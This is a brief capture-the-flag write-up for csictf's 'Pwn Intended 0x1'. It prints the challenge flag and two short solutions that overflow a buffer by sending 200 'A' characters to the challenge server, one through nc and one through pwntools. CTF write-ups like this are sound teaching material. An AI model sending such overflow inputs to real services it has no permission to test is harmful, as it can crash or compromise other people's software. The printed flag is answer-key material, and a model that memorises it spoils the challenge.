# Pwn Intended 0x1
Smash the keyboard.

**csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}**

## Scripting it
I guess if you really want to, you could...

```
python -c 'print "A" * 200' | nc chall.csivit.com 30001
```

## Pwntools
Ok this is pushing it a bit

```python
from pwn import *

p = remote('chall.csivit.com', 30001)

p.sendline('A' * 200)

print(p.clean().decode())
```